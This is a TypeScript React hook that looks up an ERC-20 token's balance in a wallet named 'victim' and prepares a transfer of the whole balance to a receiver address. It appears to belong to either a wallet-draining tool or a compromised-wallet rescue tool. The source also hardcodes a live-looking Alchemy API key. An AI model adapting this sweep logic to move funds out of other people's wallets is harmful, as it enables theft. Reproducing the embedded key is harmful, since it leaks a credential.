import { Alchemy, Network } from 'alchemy-sdk';
import { Contract, JsonRpcProvider } from 'ethers';
import { useCallback, useMemo, useState } from 'react';
import { toast } from 'sonner';
import { useLocalStorage } from 'usehooks-ts';
import { encodeFunctionData, formatUnits, isAddress } from 'viem';

import { CHAIN_ID, RPC_URLS } from '@/lib/constants';
import ERC20_ABI from '@/lib/constants/abis/erc20.json';
import { ITokenMetadata } from '@/types/tokens';

export const useTokenDetails = () => {
  const provider = useMemo(() => {
    return new JsonRpcProvider(RPC_URLS[CHAIN_ID]);
  }, []);

  const [_, setDetectedAssets] = useLocalStorage<{
    [account: string]: ITokenMetadata[];
  }>('detectedAssets', {});

  const [alchemy] = useState<Alchemy>(
    new Alchemy({
      apiKey: 'MbGU597_l6VQgQ5Cv3bpJsZmYx4gb6cN',
      network:
        process.env.NEXT_PUBLIC_NETWORK === 'sepolia'
          ? Network.ETH_SEPOLIA
          : Network.ETH_MAINNET,
    }),
  );

  const getTokenDetails = useCallback(
    async (
      tokenAddress: string,
      victimWalletAddress: string,
      receiverWalletAddress = '0x0000000000000000000000000000000000000000',
      options?: {
        onError: () => void;
      },
    ) => {
      try {
        if (
          !isAddress(victimWalletAddress) ||
          !isAddress(receiverWalletAddress)
        ) {
          return null;
        }

        if (!alchemy) {
          toast.error(
            'Api rate limit has been reached. Please try again later.',
          );
          return null;
        }

        const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
        const tokenBalance = await tokenContract.balanceOf(victimWalletAddress);

        const metadata = await alchemy.core.getTokenMetadata(tokenAddress);

        const tokenMetadata: ITokenMetadata = {
          type: 'erc20',
          address: tokenAddress as `0x${string}`,
          info: `ERC20 - ${tokenAddress || metadata.symbol || metadata.name}`?.toLowerCase(),
          symbol: metadata.symbol || '',
          amount: formatUnits(tokenBalance || '0', metadata.decimals || 18),
          amountBigInt: (tokenBalance || BigInt(0)).toString(),
          decimals: metadata.decimals || 18,
          toEstimate: {
            from: victimWalletAddress as `0x${string}`,
            to: tokenAddress as `0x${string}`,
            data: encodeFunctionData({
              abi: ERC20_ABI,
              functionName: 'transfer',
              args: [receiverWalletAddress, tokenBalance],
            }) as `0x${string}`,
          },
        };

        setDetectedAssets((prev: { [account: string]: ITokenMetadata[] }) => ({
          ...prev,
          [victimWalletAddress]: {
            ...(prev?.[victimWalletAddress] || {}),
            tokenMetadata,
          },
        }));

        return tokenMetadata;
      } catch {
        options?.onError?.();
        return null;
      }
    },
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [provider, alchemy],
  );

  return { getTokenDetails };
};
